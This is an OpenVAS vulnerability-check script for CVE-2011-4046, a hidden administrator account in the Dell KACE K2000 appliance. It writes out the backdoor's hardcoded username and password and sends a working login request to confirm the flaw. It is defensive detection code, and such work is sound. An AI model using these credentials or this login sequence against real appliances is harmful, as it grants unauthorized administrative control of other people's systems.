###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dell_kace_2000_backdoor.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Dell KACE K2000 Backdoor
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:quest:kace_systems_management_appliance';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103318");
  script_cve_id("CVE-2011-4046");
  script_bugtraq_id(50605);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 11997 $");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dell KACE K2000 Backdoor");

  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-11 11:42:28 +0100 (Fri, 11 Nov 2011)");

  script_tag(name:"qod_type", value:"remote_vul");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_quest_kace_sma_detect.nasl");
  script_mandatory_keys("quest_kace_sma/detected", "quest_kace_sma/model");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"The Dell KACE K2000 System Deployment Appliance contains a hidden
administrator account that allow a remote attacker to take control of an affected device.");

  script_tag(name:"solution", value:"Update to version 3.7 or later.");

  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/135606");
  script_xref(name:"URL", value:"http://www.kace.com/support/kb/index.php?action=artikel&id=1120&artlang=en");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

model = get_kb_item("quest_kace_sma/model");
if (model !~ "^(k|K)2000")
  exit(0);

req = http_get(item: "/", port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

session_id = eregmatch(pattern:"Set-Cookie: (kboxid=[^;]+)",string:buf);
if (isnull(session_id[1]))
  exit(0);

sess = session_id[1];

up = "kbox1248163264128256";
url = "/_login";
host = get_host_name();

ex = string("LOGIN_NAME=",up,"&LOGIN_PASSWORD=",up,"&save=Login");

req = string(
	     "POST ", url, " HTTP/1.1\r\n",
	     "Host: ", host,"\r\n",
	     "Content-Type: application/x-www-form-urlencoded;\r\n",
	     "Connection: Close\r\n",
	     "Cookie: ",sess,"\r\n",
	     "Content-Length: ",strlen(ex),"\r\n",
	     "\r\n",
	     ex
	     );

res = http_send_recv(port:port, data:req);

if(res =~ "^HTTP/1.. 30") {
  loc = "/tasks";
  req = string(
  	       "GET ", loc , " HTTP/1.1\r\n",
	       "Host: ", host,"\r\n",
	       "Cookie: ",sess,"\r\n",
  	       "Connection: Keep-Alive\r\n\r\n"
              );

  res = http_send_recv(port:port, data:req);

  if("Logged in as: kbox" >< res && "Log Out" >< res) {
    report = "It was possible to log in with the hidden administrator account.";
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(0);
